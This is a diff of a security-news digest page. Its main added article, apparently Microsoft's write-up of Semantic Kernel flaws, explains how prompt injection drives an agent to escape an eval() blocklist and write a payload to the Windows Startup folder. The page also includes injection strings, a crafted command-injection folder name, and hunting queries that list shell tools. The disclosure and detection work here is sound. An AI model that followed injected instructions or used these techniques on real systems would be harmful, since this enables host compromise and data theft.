-- LSA Protection (RunAsPPL), Credential Guard, and removing cached credentials where feasible. Mimikatz-class techniques become noisy and partial regardless of EDR coverage.
-- ASR rules in block mode for the well-known initial access and execution paths (Office child processes, obfuscated scripts, LSASS access, executable content from email/web).
-- PowerShell script block logging and module logging on, shipped to the SIEM. Cheap, high signal, independent of the EDR.
-- Local admin separation (LAPS), tiered admin model, no domain admin sessions on workstations. Limits what a successful bypass is worth.
-If app control and ASR are off, the EDR is doing work that should have been prevented one layer down.
-2. Build SIEM detections that do not rely on the EDR's verdict.
-The EDR ships you events even when it does not alert on them. Your SIEM is where you turn those raw events into detections the vendor did not write, and where you correlate across sources the EDR cannot see.
-- Ingest raw process, file, registry, network, and module-load telemetry from the endpoint, plus Windows Security, PowerShell, Sysmon, DNS, and proxy logs. Do not depend on the EDR's alert stream alone.
-- Write correlation rules for the gaps reverse engineering tends to expose: signed-binary execution from unusual paths, LOLBin chains, WMI/COM lateral movement, service creation outside change windows, scheduled task creation by interactive users, anomalous parent-child process relationships.
-- Run purple team exercises that explicitly assume the EDR is silent on the initial access host. The SIEM rule is what has to fire.
-3. Put weight on identity detection.
-Identity is where most modern intrusions actually move, and it is the layer least dependent on endpoint product internals. It also tends to survive when the endpoint layer is bypassed.
-- Sign-in risk and user risk policies in Entra ID (or equivalent), with Conditional Access enforcing MFA, device compliance, and location/risk-based blocks.
-- Detect impossible travel, atypical sign-in locations, MFA fatigue patterns, legacy auth attempts, and PRT anomalies.
-- Detect token theft indicators: refresh tokens used from a different device or IP address than they were issued to, session cookies replayed from unexpected locations.
-- Detect service principal and OAuth app abuse: new consents to high-privilege scopes, app registrations created outside change processes, service principals authenticating from new IP addresses.
-- Watch directory-side actions: privileged group changes, role assignments, Conditional Access policy edits, federation/trust changes, certificate-based auth additions.
-- For on-premises AD: Kerberoasting, AS-REP roasting, DCSync, ticket anomalies, and changes to, ACLs on tier-zero objects.
-These detections fire on IdP and directory telemetry, not on the EDR's view of the endpoint. They keep working when the endpoint layer does not.
-4. Treat the EDR as one signal among many.
-Defense in depth was always the right model. It becomes load-bearing when the first line is predictable. Practical checks:
-- Map your high-severity alerts back to their source. If most come from a single product, the other layers are decorative.
-- Add canary files, accounts, services, and credentials. They detect the techniques rules miss because they detect intent, not pattern.
-- Pay attention to network egress: beaconing, DNS anomalies, unexpected outbound destinations, traffic to fresh domains. These are independent of any endpoint verdict.
-5. Treat this as an architectural problem, not a vendor problem.
-The issue is not that one product is bad. The broader defensive model leaned on opaque logic, product complexity, and access friction, and those assumptions are aging out. Update procurement, architecture review, and tabletop scenarios to reflect a world where the internal logic of any defensive product can be studied by a motivated attacker, then make sure the layers that do not depend on that opacity (host hardening, SIEM correlation, identity detection) are doing real work.
-Opaque was Never Durable
-InfoSec will continue to fixate on the dramatic parts of AI security threats while missing the operational reality. We will keep talking about autonomous exploit generation while attackers use the same tools to map defensive capabilities, understand product behavior, and reduce the cost of bypass development.
-The organizations that adapt their security architecture to account for inspectable defensive tooling will be in a much better position. The ones that do not will eventually discover that their security stack was providing less protection than they thought.
-The difference this time is speed and scale. What used to take specialized teams months can now take capable operators days. What used to require deep product expertise now increasingly requires the right workflow, the right artifacts, and the right prompts.
-Sample EDR Skill - [https://gist.github.com/HackingLZ/8956b015a55412522d22a88e0dd284fc](https://gist.github.com/HackingLZ/8956b015a55412522d22a88e0dd284fc)
-Sample EDR Large Prompt - [https://gist.github.com/HackingLZ/a9f71c8ea7bd6d867765bda0af2460f6](https://gist.github.com/HackingLZ/a9f71c8ea7bd6d867765bda0af2460f6)</div>
+            <h2 class="article-title">When prompts become shells: RCE vulnerabilities in AI agent frameworks</h2>
+            <p class="source-link">Source: Microsoft Security Blog | <a href="https://www.microsoft.com/en-us/security/blog/2026/05/07/prompts-become-shells-rce-vulnerabilities-ai-agent-frameworks/" target="_blank">Original Link</a></p>
+            <div class="content-text">AI agents have fundamentally changed the threat model of AI model-based applications. By equipping these models with plugins (also called tools), your agents no longer just generate text; they now read files, search connected databases, run scripts, and perform other tasks to actively operate on your network.
+Because of this, vulnerabilities in the AI layer are no longer just a content issue and are an execution risk. If an attacker can control the parameters passed into these plugins via prompt injection, the agent may be driven to perform actions beyond its intended use.
+The AI model itself isn’t the issue as it’s behaving exactly as designed by parsing language into tool schemas. The vulnerability lies in how the framework and tools trust the parsed data.
+To build powerful applications, developers rely heavily on frameworks like Semantic Kernel, LangChain, and CrewAI. These frameworks act as the operating system for AI agents, abstracting away complex model orchestration. But this convenience comes with a hidden cost: because these frameworks act as a ubiquitous foundational layer, a single vulnerability in how they map AI model outputs to system tools carries systemic risk.
+As part of our mission to make AI systems more secure and eliminate new class of vulnerabilities, we’re launching a research series focused on identifying vulnerabilities in popular AI agent frameworks. Through responsible disclosure, we work with maintainers to ensure issues are addressed before sharing our findings with the community.
+In this post, we share details on the vulnerabilities we discovered in Microsoft’s Semantic Kernel, along with the steps we took to address them and interactive way to try it yourself. Stay tuned for upcoming blogs where we’ll dive into similar vulnerabilities found in frameworks beyond the Microsoft ecosystem.
+Background
+We discovered a vulnerable path in Microsoft Semantic Kernel that could turn prompt injection into host-level remote code execution (RCE).
+A single prompt was enough to launch calc.exe on the device running our AI agent, with no browser exploit, malicious attachment, or memory corruption bug needed. The agent simply did what it was designed to do: interpret natural language, choose a tool, and pass parameters into code.
+This scenario is the real security story behind modern AI agents. Once an AI model is wired to tools, prompt injection draws a thin line between being just a content security problem and becoming a code execution primitive. In this post in our research series on AI agent framework security, we show how two vulnerabilities in Semantic Kernel could allow attackers to cross that line, and what customers should do to assess exposure, patch affected agents, and investigate whether exploitation may already have occurred.
+A representative case study: Semantic Kernel
+Semantic Kernel is Microsoft’s open-source framework for building AI agents and integrating AI models into applications. With over 27,000 stars on GitHub, it provides essential abstractions for orchestrating AI models, managing plugins, and chaining workflows.
+During our security research into the Semantic Kernel framework, we identified and disclosed two critical vulnerabilities: CVE-2026-25592 and CVE-2026-26030. These flaws, which have since been fixed, could allow an attacker to achieve unauthorized code execution by leveraging injection attacks specifically targeted at agents built within the framework.
+In the following sections, we break down the mechanics of these vulnerabilities in detail and provide actionable guidance on how to harden your agents against similar exploitation.
+CVE-2026-26030: In-Memory Vector Store
+Exploitation of this vulnerability requires two conditions:
+- The attacker must have a prompt injection vector, allowing influence over the agent’s inputs
+- The targeted agent must have the Search Plugin backed by In-Memory Vector Store functionality using the default configuration
+When both these two conditions are met, the vulnerability enables an attacker to achieve RCE from a prompt.
+To demonstrate how this vulnerability could be exploited, we built a “hotel finder” agent using Semantic Kernel. First, we created an In Memory Vector collection to store the hotels’ data, then exposed a search_hotels(city=…) function to the kernel (agent) so that the AI model could invoke it through tool calling.
+When a user inputs, for example, “Find hotels in Paris,” the AI model calls the search plugin with city=”Paris”. The plugin then first runs a deterministic filter function to narrow down the dataset and computes vector similarity (embeddings).
+With this understanding of how a Semantic Kernel agent performs the search, let’s dive deep into the vulnerability.
+Issue 1: Unsafe string interpolation
+The default filter function that we mentioned previously is implemented as a Python lambda expression executed using eval(). In our example, The default filter will result to new_filter = “lambda x: x.city == ‘Paris’”.
+The vulnerability is that kwargs[param.name] is AI model-controlled and not sanitized. This acts as a classic injection sink. By closing the quote (‘) and appending Python logic, an attacker could turn a simple data lookup into an executable payload:
+- Input: ‘ or MALICIOUS_CODE or ‘
+- Result: lambda x: x.city == ” or MALICIOUS_CODE or ”
+Issue 2: Avoidable blocklist
+The framework developers anticipated this RCE risk and implemented a validator that parses the filter string into an Abstract Syntax Tree (AST) before execution.
+Before running a user-provided filter code, the application runs a validation function designed to block unsafe operations. At a high level, the validation does the following:
+- It only allows lambda expressions. It rejects outright any attempt to pass full code blocks (such as import statements or class definitions).
+- It scans every element in the code for dangerous identifiers and attributes that could enable arbitrary code execution (for example, strings like eval, exec, open, __import__, and similar ones). If any of these identifiers appear, the code is rejected.
+- If the code passes both checks, it is executed in a restricted environment where Python’s built-in functions (like open and print) are deliberately removed. So even if something slips through, it shouldn’t have access to dangerous capabilities.
+The resulting lambda is then used to filter records in the Vector Store.
+While this approach is solid in theory, blocklists in dynamic languages like Python are inherently fragile because the language’s flexibility allows restricted operations to be reintroduced through alternate syntax, libraries, or runtime evaluation.
+We found a way to bypass this blocklist implementation through a specially crafted exploit prompt.
+Exploit
+Our exploit prompt was designed to manipulate the agent into triggering a Search Plugin invocation with an input that ultimately leads to malicious code execution:
+This prompt circumvented the agent to trigger the following function calling:
+As result, the lambda function was formatted as the following and executed inside eval(). This payload escaped the template string, traversed Python’s class hierarchy to locate BuiltinImporter, and used it to dynamically load os and call system(). These steps bypassed the import blocklists to launch an arbitrary shell command (for example, calc.exe) while keeping the template syntax valid with a clean closing expression.
+The filter function didn’t block the payload because of the following reasons:
+1. Missing dangerous names
+The payload used several attributes that weren’t in the blocklist:
+- __name__ – Used to find BuiltinImporter by name
+- load_module – The method that imports modules
+- system – The method that executes shell commands
+- BuiltinImporter – The class itself
+2. Structural check passes
+The payload was wrapped inside a valid lambda expression. The check isinstance(tree.body, ast.Lambda) passed because the entire thing is in itself a lambda that just happens to contain malicious code in its body.
+3. Empty __builtins__ is irrelevant
+The eval() call used {“__builtins__”: {}} to remove access to built-in functions. However, this protection was meaningless because the payload never used built-ins directly. Instead, it started with tuple(), which exists regardless of the builtins environment, and crawled through Python’s type system to reach dangerous functionality.
+4. No ast.Subscript checking
+While not used in this payload, it’s worth noting that the filter only checked ast.Name and ast.Attribute nodes. If the payload needed to use a blocked name, it could’ve accessed it using bracket notation (for example, obj[‘__class__’] instead of obj.__class__), which creates an ast.Subscript node that the validation completely ignored.
+Mitigation
+After responsibly disclosing the vulnerability to MSRC, the Microsoft Semantic Kernel team implemented a comprehensive fix using four layers of protection to eliminate every escape primitive needed to turn a lambda filter into executable code:
+- AST node-type allowlist – Permits only safe constructs like comparisons, boolean logic, arithmetic, and literals.
+- Function call allowlist – Checks even allowed AST call nodes to ensure only safe functions can be invoked.
+- Dangerous attributes blocklist – Blocks class hierarchy traversal (for examples, __class__, __subclasses__).
+- Name node restriction – Allows only the lambda parameter (for example, x) as a bare identifier and rejects references to os, eval, type, and others.
+How do I know if I am affected?
+Your agent is vulnerable to CVE-2026-26030 if it meets all of the following conditions:
+- It uses the Python package
+[semantic-kernel](https://pypi.org/project/semantic-kernel/). - It’s running a framework version prior to 1.39.4.
+- It uses the In-Memory Vector Store and relies on its filter functionality (when acting as the backend for the Search Plugin using default configurations).
+What to do if I am affected?
+You don’t need to rewrite your agent. Upgrading the Python semantic-kernel dependency to version 1.39.4 or higher mitigates the risk.
+What about the time that my agent was vulnerable?
+While patching closes the bug, but it doesn’t answer the retrospective question defenders care about: whether their agent was exploited before they upgraded.
+First, define the vulnerable window for each affected deployment: from the moment a vulnerable Semantic Kernel Python version was deployed until the moment version 1.39.4 or later was installed. Any investigation should focus on that time range.
+Second, hunt for host-level post-exploitation signals during that vulnerable window. Because successful exploitation results in code execution on the host, the most useful evidence is in endpoint telemetry: suspicious child processes, outbound connections, or persistence artifacts created by the agent host process. We provide a set of practical advanced hunting queries for further investigation in a separate section of this blog.
+If you find suspicious activity during that window, treat it as a potential host compromise. Review the affected host, rotate credentials and tokens accessible to the agent, and investigate what data or systems that host could reach.
+CVE-2026-25592: Arbitrary file write through SessionsPythonPlugin
+Before diving into the mechanics of this second vulnerability, here is what an agent sandbox escape looks like in practice: with a single prompt, an attacker could bypass a cloud-hosted sandbox, write a malicious payload directly to the host device’s Windows Startup folder, and achieve full RCE.
+The container boundary
+Semantic Kernel includes a built-in plugin called SessionsPythonPlugin that allows agents to safely execute Python code inside Azure Container Apps dynamic sessions, which are isolated cloud hosted sandboxes with their own filesystem.
+The security model relies entirely on this boundary. Code runs in the isolated sandbox and cannot touch the host device where the agent process runs. To help move data in and out of the sandbox, the plugin uses helper functions like UploadFile and DownloadFile, which run on the host side to transfer files across this boundary.
+The vulnerability
+In the .NET software development kit (SDK), DownloadFileAsync was accidentally marked with a [KernelFunction] attribute, which officially advertised it to the AI model as a callable tool, complete with its parameter schema:
+Because of this attribute, the localFilePath parameter, which dictates exactly where File.WriteAllBytes() saves data on the host device, was now entirely AI controlled. With no path validation, directory restriction, or sanitization in place, an attacker wouldn’t need a complex hypervisor exploit; they just needed to prompt the model to do it for them.
+(Note: Arbitrary File Read. A similar vulnerability existed in reverse for the upload_file() function across both the Python and .NET SDKs. It accepted any local file path without validation, allowing prompt injections to exfiltrate sensitive host files, like SSH keys or credentials, directly into the sandbox).
+Attack chain overview
+By chaining two exposed tools, an attacker could turn standard function calling into a sandbox escape:
+Step 1: Create the payload
+An injected prompt instructs the agent to use the ExecuteCode tool to generate a malicious script inside the isolated container:
+At this point, the payload is contained. It exists only in the sandbox and cannot execute on the host.
+Step 2: Escape the sandbox
+A second injected instruction tells the AI model to use the [DownloadFileAsync](vscode-file://vscode-app/c:/Users/t-urioren/AppData/Local/Programs/Microsoft%20VS%20Code/cfbea10c5f/resources/app/out/vs/code/electron-browser/workbench/workbench.html) tool to download the file to a dangerous location on the host:
+The agent calls:
+The agent fetches the script from the sandbox’s API and writes it directly to the host’s Windows\Start Menu\Programs\Startup folder.
+Step 3: Execute the code
+On the next user sign-in, the script runs, granting full host compromise.
+This exploit illustrates the [MITRE ATLAS](https://atlas.mitre.org/) technique AML.T0051 (LLM Prompt Injection) cascading into AML.T0016 (Obtain Capabilities).
+Exposing DownloadFileAsync provided a direct file write primitive on the host filesystem, effectively negating the container isolation.
+The fix and how to defend
+Semantic Kernel [patched](https://github.com/microsoft/semantic-kernel/pull/13478/changes) this vulnerability by removing the root cause of tool exposure and adding defense in depth:
+Removed AI access – The [KernelFunction] attribute was removed, making the function invisible to the AI model. The AI agent can no longer invoke it, and prompt injection can no longer reach it:
+This single change breaks the entire attack chain. The AI can now only be called directly by the developer’s intentional code.
+- Path validation – For developers calling the function programmatically, a ValidateLocalPathForDownload() method was added using path canonicalization (Path.GetFullPath()) and directory allowlist matching to ensure the target path falls within permitted directories:
+How do I know if I am affected?
+Your agent is vulnerable to CVE-2026-25592 if it uses a Semantic Kernel .NET SDK version older than 1.71.0.
+Defending the agentic edge
+If you use Semantic Kernel, our primary recommendation is to upgrade immediately. You don’t need to rewrite your agent’s architecture; the security updates simply remove the AI model’s ability to trigger these functions autonomously.
+More broadly, defending AI agents requires acknowledging that AI models aren’t security boundaries. Security teams must correlate signals across two layers: the AI model level (intent detection through meta prompts and content safety filters) and the host level (execution detection). If an attacker bypasses the AI model guardrails, traditional endpoint defense must be in place to detect anomalous behavior, such as an AI agent process suddenly spawning command lines or dropping scripts into Startup folders.
+Not bugs, but developed by design
+Untrusted data being used as input for high-risk operations isn’t entirely new. In the early days of web application security, such input was passed directly into SQL queries or filesystem APIs. Today, agents are doing something similar, in that they could map untrusted natural-language input to system tools.
+The overarching lesson from both vulnerabilities is that both aren’t bugs in the AI model itself, but rather issues in agent architecture and tool design. We must make a clear distinction between model behavior and agent architecture. The AI model functions exactly as it was designed to: translate intent into structured tool calls.
+When models are connected to system tools, prompt injection risks may extend beyond typical chatbot misuse and require additional safeguards. Instead, it becomes a direct path to concrete execution primitives like data exfiltration, arbitrary file writes, and RCE. For a deeper look at the runtime risks of tool-connected AI models, see [Running OpenClaw safely: identity, isolation, and runtime risk](https://www.microsoft.com/en-us/security/blog/2026/02/19/running-openclaw-safely-identity-isolation-runtime-risk/).
+As mentioned previously, your LLM is not a security boundary. The tools you expose define your attacker’s affected scope. Any tool parameter the model can influence must be treated as attacker-controlled input.
+In the next blog in this series, we’ll expand beyond Semantic Kernel to explore structurally similar execution vulnerabilities that we found in other widely used third-party agent frameworks.
+CTF challenge: Attack your own agent
+If you want to see how prompt injections escalate into execution and to put your skills to the test, we’ve packaged the vulnerable hotel-finder agent that we described in this blog into an interactive, hands-on capture-the-flag (CTF) challenge.
+This CTF challenge lets you step into the shoes of an attacker and try to exploit the CVE-2026-26030 vulnerability in a controlled environment. You need to craft a prompt injection that not only bypasses the agent’s natural language defenses but also smuggle a Python AST-traversal payload through the vulnerable eval() sink.
+To see if you can manipulate the AI model into launching arbitrary code and popping calc.exe on the server, download the challenge, spin it up in a sandbox, and see if you can achieve RCE. Keep in mind that this challenge is for educational purposes only, and shouldn’t be run in production environments.
+Reconnaissance:
+Exploit (jailbreak and payload):
+Note: Because the agent will running locally on your device, calc.exe will open on your desktop. In a real-world scenario, such an executable file will launch remotely on the server hosting the agent.
+Download the CTF challenge: [https://github.com/amiteliahu/AIAgentCTF/tree/main/CVE-2026-26030](https://github.com/amiteliahu/AIAgentCTF/tree/main/CVE-2026-26030)
+Advanced hunting
+The following advanced hunting queries lets you surface suspicious activities from Semantic Kernel agents.
+Detect common RCE post-exploitation child processes from Semantic Kernel agent hosts
+1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 | DeviceProcessEvents | where Timestamp > ago(30d) | where InitiatingProcessCommandLine matches regex @"(?i)semantic[\s_\-]?kernel" or InitiatingProcessFolderPath matches regex @"(?i)semantic[\s_\-]?kernel" | where FileName in~ ( "cmd.exe", "powershell.exe", "pwsh.exe", "bash.exe", "wsl.exe", "certutil.exe", "mshta.exe", "rundll32.exe", "regsvr32.exe", "wscript.exe", "cscript.exe", "bitsadmin.exe", "curl.exe", "wget.exe", "whoami.exe", "net.exe", "net1.exe", "nltest.exe", "klist.exe", "dsquery.exe", "nslookup.exe" ) | project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine, InitiatingProcessFileName, InitiatingProcessCommandLine, InitiatingProcessFolderPath | sort by Timestamp desc |
+Detect .NET hosting Semantic Kernel that spawns suspicious children
+1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 | DeviceProcessEvents | where Timestamp > ago(30d) | where InitiatingProcessFileName in~ ("dotnet.exe") | where InitiatingProcessCommandLine matches regex @"(?i)(semantic[\s_\-]?kernel|SKAgent|kernel\.run)" | where FileName in~ ( "cmd.exe", "powershell.exe", "pwsh.exe", "bash.exe", "certutil.exe", "curl.exe", "whoami.exe", "net.exe" ) | project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine, InitiatingProcessFileName, InitiatingProcessCommandLine | sort by Timestamp desc |
+Learn more
+For the latest security research from the Microsoft Threat Intelligence community, check out the [Microsoft Threat Intelligence Blog](https://aka.ms/threatintelblog).
+To get notified about new publications and to join discussions on social media, follow us on [LinkedIn](https://www.linkedin.com/showcase/microsoft-threat-intelligence), [X (formerly Twitter)](https://x.com/MsftSecIntel), and [Bluesky](https://bsky.app/profile/threatintel.microsoft.com).
+To hear stories and insights from the Microsoft Threat Intelligence community about the ever-evolving threat landscape, listen to the [Microsoft Threat Intelligence podcast](https://thecyberwire.com/podcasts/microsoft-threat-intelligence).
+Review our documentation to learn more about our real-time protection capabilities and see how to enable them within your organization.
+- Learn more about
+[securing Copilot Studio agents with Microsoft Defender](https://learn.microsoft.com/en-us/defender-cloud-apps/ai-agent-protection) - Evaluate your AI readiness with our latest
+[Zero Trust for AI workshop](https://microsoft.github.io/zerotrustassessment/). - Learn more about
+[Protect your agents in real-time during runtime (Preview)](https://learn.microsoft.com/en-us/defender-cloud-apps/real-time-agent-protection-during-runtime) - Explore
+[how to build and customize agents with Copilot Studio Agent Builder](https://eurppc-word-edit.officeapps.live.com/we/%E2%80%A2%09https:/learn.microsoft.com/en-us/microsoft-365-copilot/extensibility/copilot-studio-agent-builder) [Microsoft 365 Copilot AI security documentation](https://learn.microsoft.com/en-us/copilot/microsoft-365/microsoft-365-copilot-ai-security)[How Microsoft discovers and mitigates evolving attacks against AI guardrails](https://www.microsoft.com/en-us/security/blog/2024/04/11/how-microsoft-discovers-and-mitigates-evolving-attacks-against-ai-guardrails/)</div>
             <br>
             <button class="back-btn" onclick="window.scrollTo(0,0)">[ Back to Menu ]</button>
             <hr class="separator">
         </div>
         <div id="art-4" class="article-body">
+            <h2 class="article-title">Shift Happens – Uncovering Two Built-in Command Injections in Windows Context Menus</h2>
+            <p class="source-link">Source: Research & Tradecraft Archives - SpecterOps | <a href="https://specterops.io/blog/2026/05/07/shift-happens-uncovering-two-built-in-command-injections-in-windows-context-menus/" target="_blank">Original Link</a></p>
+            <div class="content-text"><p>TL;DR: Two command injection vulnerabilities exist in the Windows Explorer “Open PowerShell window here” context menu due to improper quoting and command injection through user-controlled folder paths. By creating folders with crafted names (e.g., folder; calc), an attacker can trigger arbitrary PowerShell command execution when a user uses Shift + Right-Click → Open PowerShell window [&#8230;]</p>
+<p>The post <a href="https://specterops.io/blog/2026/05/07/shift-happens-uncovering-two-built-in-command-injections-in-windows-context-menus/">Shift Happens &#8211; Uncovering Two Built-in Command Injections in Windows Context Menus</a> appeared first on <a href="https://specterops.io">SpecterOps</a>.</p>
+
+[Full content could not be extracted. Visit source for details.]</div>
+            <br>
+            <button class="back-btn" onclick="window.scrollTo(0,0)">[ Back to Menu ]</button>
+            <hr class="separator">
+        </div>
+        <div id="art-5" class="article-body">
+            <h2 class="article-title">GRC in an AI World - Staying in the Fast Lane Without Losing the Race!</h2>
+            <p class="source-link">Source: TrustedSec | <a href="https://trustedsec.com/blog/grc-in-an-ai-world" target="_blank">Original Link</a></p>
+            <div class="content-text">GRC in an AI World - Staying in the Fast Lane Without Losing the Race!
+Artificial Intelligence (AI) is the new buzz word on the streets. It’s becoming “the best thing since sliced bread” in the IT world and is being used by everyone from executives to employees, students, and even young kids. Some of the top questions we get in consulting are, “How can we leverage AI?” and “How do we stay secure?” For those in Governance Risk and Compliance (GRC), it’s “What’s the risk?”
+Just like in Talladega Nights, many companies want to be the Ricky Bobby’s of IT and use AI to say “I wanna go fast” to improve productivity and maintain that cutting edge. However, GRC is a bit different from the SDLC or marketing world where AI is used more prevalently.
+While there is no secret sauce to security or compliance, the answer is often the simplest: Go back to basic cyber hygiene. Whether it’s driving a NASCAR race car or a smart car, basic components remain. Regardless of if your organization is a small startup or a large-scale corporation, security and compliance practices have not changed drastically. The standards are updated but day-to-day best practices haven’t evolved as much as you might think, but they do require a tune up now and then. Here’s some simple reminders to help “Shake and Bake” and stay compliant all while using AI. Fasten your seatbelts!
+Dos - Prepping for the track:
+- Perform an AI risk assessment or impact assessment prior to implementation and map use cases to business needs. Examples include:
+- What is the risk if AI is or is not implemented?
+- What problem or use case does it help the company solve?
+- Would it be more productive for identified scenarios or would it hinder progress?
+- What impact would implementation have on relationships with third-parties or customers the company does business with?
+- Evaluate risks identified, such as data leakage, insecure output, system compromise, or third-party risk.
+- Develop policies and procedures around AI toolsets and usage and communicate requirements to all users and interested parties.
+- Be aware of industry-specific restrictions prior to implementation.
+- Does the company have specific regulatory and compliance needs it must adhere to such as, HIPAA, PCI, GDPR, etc. that would prohibit access to sensitive data or require “minimum exposure” requirements for protection against compliance violations?
+- Inventory and classify all data within the environment.
+- Specifically, what data will be collected and processed for AI specific tasks.
+- Train all users on what data is permitted and not permitted to use with AI toolsets.
+- Prohibited use could include customer data, internal company data, and data that could potentially include personally identifiable information (PII) or intellectual property (IP).
+- Permitted use could include summarizing publicly available documents or frameworks for understanding or aggregating data sets that do not include customer or sensitive information.
+- Use only authorized “closed” AI systems with enterprise-level protections.
+- Ensure proper technical controls are deployed to allow “minimum exposure”, especially if using sensitive data sets or unstructured data.
+- Maintain human oversight for all output.
+- This can be critical for coding, policies, procedures, playbooks, and legal documents, as many legal documents must now include AI addendums to ensure humans have reviewed the output for accuracy.
+- Verify and validate AI models for performance.
+- Document output, specifically when, how, and approved usage of AI technology within the environment. Ensure accountability and transparency between the system and user.
+- Be able to interpret decisions or output made by AI toolsets, using human oversight, specifically for development or intellectual property. Explainability is essential for functionality and impact to systems.
+- Log AI tools when able.
+- Treating all toolsets in the environment the same way as regular software should apply to AI. From an IR and GRC perspective all actions should be tied back to a specific user or system and logged.
+- Setup alerting for unauthorized use or data loss.
+- Maintain safety of AI systems and continue to perform impact assessments and improvements.
+Avoid getting disqualified! Here’s some key items to prevent crashing and burning down your compliance department and being removed from the race.
+DQs - Don’t get caught cutting corners:
+- Deploy toolsets without developing, updating, and distributing policies and procedures on proper AI usage for both work and home if remote work is in-scope. Examples include:
+- Use of AI recording during meetings internally and externally without proper consent.
+- Relying on meeting translations to create company documents or reports.
+- Dismissing the use of AI tools while working at home, e.g., artificial intelligence of things (AIoT) such as smart home devices (Amazon Echo or Google Nest), home security devices, wearables (smart watches), etc.
+- Integrating Industrial IoT (IIoT) devices or sensors for company use without proper testing or approval.
+- Omit risk assessment or impact assessments processes prior to deployment.
+- Permit toolset deployment without proper data classification and technological controls in place to protect accidental data disclosure.
+- Allow Shadow AI such as applications, SaaS tools, browser extensions, or open-source AI technology.
+- Share confidential, sensitive, or privileged information with public AI tools.
+- Ensure that information is only shared with prior authorization in company approved toolsets.
+- Forget to setup logging and monitoring.
+- Allow output from AI to be used externally or in a production setting without proper human oversight and following of system lifecycle review practices.
+- Set it and forget it, continue monitoring, improving, and preventing AI risks.
+AI is the new exciting and rapidly growing technology, not just security, programming, or IT, but also for areas of public facing business such as marketing. There are many pros and cons to using these tools to be more productive but ensuring the right safety protocols are implemented will ensure a safe and fun race to the finish line for whatever project is chosen. Being prepared and knowledgeable on industry best practices will ensure the organization has the right pit crew for the job!
+For more information the following resources can assist with preparing for race day!
+[https://www.iso.org/standard/42001](https://www.iso.org/standard/42001)[https://nvlpubs.nist.gov/nistpubs/ai/NIST.AI.100-1.pdf](https://nvlpubs.nist.gov/nistpubs/ai/NIST.AI.100-1.pdf)[https://nvlpubs.nist.gov/NISTpubs/SpecialPublications/NIST.SP.1270.pdf](https://nvlpubs.nist.gov/NISTpubs/SpecialPublications/NIST.SP.1270.pdf)
+For assistance with Risk Assessments, Program Development, or other questions regarding AI integration with NIST or ISO, [please reach out](https://trustedsec.com/contact) to see how TrustedSec can assist your business’s needs.</div>
+            <br>
+            <button class="back-btn" onclick="window.scrollTo(0,0)">[ Back to Menu ]</button>
+            <hr class="separator">
+        </div>
+        <div id="art-6" class="article-body">
             <h2 class="article-title">CISA Adds Actively Exploited Linux Root Access Bug CVE-2026-31431 to KEV</h2>
             <p class="source-link">Source: The Hacker News | <a href="https://thehackernews.com/2026/05/cisa-adds-actively-exploited-linux-root.html" target="_blank">Original Link</a></p>
             <div class="content-text">The U.S. Cybersecurity and Infrastructure Security Agency (CISA) on Friday [added](https://www.cisa.gov/news-events/alerts/2026/05/01/cisa-adds-one-known-exploited-vulnerability-catalog) a recently disclosed security flaw impacting various Linux distributions to its Known Exploited Vulnerabilities ([KEV](https://www.cisa.gov/known-exploited-vulnerabilities-catalog)) catalog, citing evidence of active exploitation in the wild.
@@ -251,20 +363,7 @@ Federal Civilian Executive Branch (FCEB) agencies have been advised to apply the
             <button class="back-btn" onclick="window.scrollTo(0,0)">[ Back to Menu ]</button>
             <hr class="separator">
         </div>
-        <div id="art-5" class="article-body">
-            <h2 class="article-title">CISA Adds Actively Exploited ConnectWise and Windows Flaws to KEV</h2>
-            <p class="source-link">Source: The Hacker News | <a href="https://thehackernews.com/2026/04/cisa-adds-actively-exploited.html" target="_blank">Original Link</a></p>
-            <div class="content-text">The U.S. Cybersecurity and Infrastructure Security Agency (CISA) on Tuesday added two security flaws impacting ConnectWise ScreenConnect and Microsoft Windows to its Known Exploited Vulnerabilities (KEV) catalog, based on evidence of active exploitation.
-The vulnerabilities are listed below -
-
-CVE-2024-1708 (CVSS score: 8.4) - A path traversal vulnerability in&nbsp; ConnectWise ScreenConnect
-
-[Full content could not be extracted. Visit source for details.]</div>
-            <br>
-            <button class="back-btn" onclick="window.scrollTo(0,0)">[ Back to Menu ]</button>
-            <hr class="separator">
-        </div>
-        <div id="art-6" class="article-body">
+        <div id="art-7" class="article-body">
             <h2 class="article-title">CISA Adds Two Known Exploited Vulnerabilities to Catalog</h2>
             <p class="source-link">Source: All CISA Advisories | <a href="https://www.cisa.gov/news-events/alerts/2026/04/28/cisa-adds-two-known-exploited-vulnerabilities-catalog" target="_blank">Original Link</a></p>
             <div class="content-text">CISA Adds Two Known Exploited Vulnerabilities to Catalog
@@ -278,7 +377,7 @@ This product is provided subject to this [Notification](/notification) and this 
             <button class="back-btn" onclick="window.scrollTo(0,0)">[ Back to Menu ]</button>
             <hr class="separator">
         </div>
-        <div id="art-7" class="article-body">
+        <div id="art-8" class="article-body">
             <h2 class="article-title">Patch Tuesday, April 2026 Edition</h2>
             <p class="source-link">Source: Krebs on Security | <a href="https://krebsonsecurity.com/2026/04/patch-tuesday-april-2026-edition/" target="_blank">Original Link</a></p>
             <div class="content-text">Microsoft today pushed software updates to fix a staggering 167 security vulnerabilities in its Windows operating systems and related software, including a SharePoint Server zero-day and a publicly disclosed weakness in Windows Defender dubbed “BlueHammer.” Separately, Google Chrome fixed its fourth zero-day of 2026, and an emergency update for Adobe Reader nixes an actively exploited flaw that can lead to remote code execution.
@@ -338,624 +437,220 @@ This cleared up a lot of confusion for me. Appreciate you putting the time into 
             <button class="back-btn" onclick="window.scrollTo(0,0)">[ Back to Menu ]</button>
             <hr class="separator">
         </div>
-        <div id="art-8" class="article-body">
+        <div id="art-9" class="article-body">
             <h2 class="article-title">North Korea-Nexus Threat Actor Compromises Widely Used Axios NPM Package in Supply Chain Attack</h2>
             <p class="source-link">Source: Threat Intelligence | <a href="https://cloud.google.com/blog/topics/threat-intelligence/north-korea-threat-actor-targets-axios-npm-package/" target="_blank">Original Link</a></p>
-            <div class="content-text"><div class="block-paragraph_advanced"><p>Written by: Austin Larsen, Dima Lenz, Adrian Hernandez, Tyler McLellan, Christopher Gardner, Ashley Zaya, Michael Rudden, Mon Liclican, Muhammad Umair</p>
-<hr /></div>
-<div class="block-paragraph_advanced"><h3><span style="vertical-align: baseline;">Introduction</span><strong style="vertical-align: baseline;"> </strong></h3>
